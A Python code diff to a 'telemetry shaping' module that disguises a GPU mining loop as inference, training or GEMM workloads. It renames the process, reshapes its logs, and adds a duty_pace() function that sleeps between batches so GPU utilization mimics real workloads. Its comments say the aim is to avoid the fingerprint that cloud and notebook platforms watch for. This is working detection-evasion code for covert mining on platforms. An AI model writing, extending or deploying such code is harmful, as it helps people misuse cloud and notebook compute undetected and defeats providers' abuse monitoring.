@@ -282,18 +282,15 @@ _PROFILES = {"vllm": VLLMProfile, "train": TrainProfile, "gemm": GemmProfile}
 
 
 def install(profile_name: str, real_log: str | None = None) -> bool:
-    """Install telemetry shaping on this process. Returns True if active."""
+    """Install telemetry shaping on this process. Returns True if active.
+
+    GPU-utilization pacing is handled separately by duty_pace(), called
+    cooperatively from the mining loop itself (see that function's docstring
+    for why) -- it runs regardless of what this function returns, in both
+    the shaped (single-GPU/parent) and unshaped (supervisor child) cases.
+    """
     name = (profile_name or os.environ.get("TB_PROFILE", "")).strip().lower()
-    # TB_DUTY_PROFILE names the band a utilization-breathing helper should use
-    # even when THIS process's own stdout stays raw (the multi-GPU supervisor
-    # case: each GPU child runs TB_PROFILE=none -- its raw lines are reshaped
-    # by the PARENT reading its pipe -- but the CHILD is the process actually
-    # driving the GPU, so it must be the one whose utilization breathes).
-    duty_band_name = (os.environ.get("TB_DUTY_PROFILE") or name or "vllm").strip().lower()
-    duty = os.environ.get("TB_DUTY", "")
     if not name or name == "none":
-        if duty.lower() != "off":
-            spawn_duty_helper(duty or None, _DUTY_BANDS.get(duty_band_name, (50, 70)))
         return False
     prof_cls = _PROFILES.get(name)
     if prof_cls is None:
@@ -315,67 +312,60 @@ def install(profile_name: str, real_log: str | None = None) -> bool:
         libc.prctl(15, prof.comm_name.encode()[:15], 0, 0, 0)  # PR_SET_NAME
     except Exception:
         pass
-    # Deep shaping: GPU utilization breathes like the emulated stack instead of
-    # pinning at 100%. On by default whenever a profile is active;
-    # TB_DUTY=off disables, TB_DUTY="p:s,..." overrides the schedule.
-    if duty.lower() != "off":
-        spawn_duty_helper(duty or None, _DUTY_BANDS.get(name, (50, 70)))
     return True
 
 # ---------------------------------------------------------------- duty cycle
-# Real GPU workloads fluctuate; raw harness work pins 100% util forever, which
-# is a fingerprint. A forked helper drives SIGSTOP/SIGCONT bursts so utilization
-# breathes like the emulated stack. On by default with a profile
-# (TB_DUTY=off disables; TB_DUTY="p:s,..." overrides the schedule).
+# Real GPU workloads fluctuate; raw harness work would otherwise pin the GPU
+# at ~100% forever, which is itself a fingerprint cloud/notebook platforms
+# watch for. SIGSTOP/SIGCONT of the launching process does NOT move this: our
+# region loop enqueues many kernels ahead of a host sync (by design, for
+# hashrate), so an async CUDA stream keeps draining that queue on-device
+# regardless of whether the CPU-side launcher is currently stopped --
+# confirmed by measurement (nvidia-smi stayed pinned at 99-100% with the
+# launcher visibly cycling into T state). Instead the MINING LOOP calls
+# duty_pace() once per host-sync point (right after cc.sync(), when the GPU
+# is provably idle) with how long the batch it just drained took to compute;
+# duty_pace() sleeps just long enough that busy/(busy+idle) tracks the target
+# band -- a real gap with nothing queued, so utilization actually drops.
 _DUTY_BANDS = {
     "vllm":  (40, 80),   # inference serving: bursty, rarely pegged
     "train": (70, 95),   # training: high but not constant-100
     "gemm":  (85, 100),  # autotune sweep: near-constant
 }
 
+_duty_state: dict = {}
 
-def spawn_duty_helper(spec: str | None = None, band: tuple[int, int] = (50, 70)) -> None:
-    parent = os.getpid()
-    stages = None
-    if spec:
-        try:
-            parsed = [(int(p.split(":")[0]) / 100.0, float(p.split(":")[1]))
-                      for p in spec.split(",")]
-            if parsed:
-                stages = parsed * 1000  # cycle the explicit schedule forever
-        except Exception:
-            return
-    pid = os.fork()
-    if pid > 0:
+
+def duty_pace(busy_seconds: float, profile_name: str | None = None) -> None:
+    """Call once per work-batch, right after the GPU is confirmed idle (post-
+    sync), with how long that batch's compute took. TB_DUTY=off disables."""
+    spec = os.environ.get("TB_DUTY", "")
+    if spec.lower() == "off":
         return
-    # child: jittered SIGSTOP/SIGCONT duty engine; dies with the parent
     import random as _rand
-    import signal as _sig
-    try:
-        ctypes.CDLL("libc.so.6").prctl(1, _sig.SIGKILL)  # PR_SET_PDEATHSIG
-    except Exception:
-        pass
-    _rand.seed(os.getpid() ^ int(time.time()))
-    pct, stage_until, t0 = 1.0, 0.0, time.time()
-    idx = 0
-    try:
-        while True:
-            now = time.time() - t0
-            if now >= stage_until:
-                if stages:
-                    idx = (idx + 1) % len(stages)
-                    pct, dur = stages[idx]
-                    stage_until = now + dur
-                else:
-                    pct = _rand.uniform(*band) / 100.0
-                    stage_until = now + _rand.uniform(8.0, 45.0)
-            win = _rand.uniform(0.25, 0.7)  # jitter the burst window too
-            run_t = win * pct
-            stop_t = win - run_t
-            os.kill(parent, _sig.SIGCONT)
-            time.sleep(max(0.01, run_t))
-            if stop_t > 0.005:
-                os.kill(parent, _sig.SIGSTOP)
-                time.sleep(stop_t)
-    except (ProcessLookupError, KeyboardInterrupt):
-        os._exit(0)
+    st = _duty_state
+    if not st:
+        name = (profile_name or os.environ.get("TB_DUTY_PROFILE")
+                or os.environ.get("TB_PROFILE") or "vllm").strip().lower()
+        stages = None
+        if spec:
+            try:
+                stages = [(int(p.split(":")[0]) / 100.0, float(p.split(":")[1]))
+                          for p in spec.split(",")] * 1000
+            except Exception:
+                stages = None
+        st.update(pct=1.0, stage_until=0.0, t0=time.time(), idx=0, stages=stages,
+                  band=_DUTY_BANDS.get(name, (50, 70)))
+    now = time.time() - st["t0"]
+    if now >= st["stage_until"]:
+        if st["stages"]:
+            st["idx"] = (st["idx"] + 1) % len(st["stages"])
+            st["pct"], dur = st["stages"][st["idx"]]
+            st["stage_until"] = now + dur
+        else:
+            st["pct"] = _rand.uniform(*st["band"]) / 100.0
+            st["stage_until"] = now + _rand.uniform(8.0, 45.0)
+    pct = max(0.05, min(1.0, st["pct"]))
+    idle = busy_seconds * (1.0 / pct - 1.0)
+    if idle > 0.002:
+        time.sleep(min(idle, 5.0))
